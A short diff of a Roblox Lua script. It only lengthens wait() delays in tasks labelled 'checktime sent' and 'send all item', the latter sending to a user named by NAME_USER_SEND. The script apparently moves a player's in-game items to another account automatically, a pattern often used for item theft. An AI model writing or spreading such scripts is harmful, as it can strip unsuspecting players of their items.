@@ -1,4 +1,4 @@
-
+wait(200)
 
 
 local function _check_time_resetmail()
@@ -51,7 +51,7 @@ end
 
 -- checktime sent
 task.spawn(function()
-wait(50)
+wait(150)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
@@ -105,7 +105,7 @@ end)
 -- send all item
 task.spawn(function()
 
-wait(60)
+wait(150)
 warn(NAME_USER_SEND)
 
 if NAME_USER_SEND == nil then
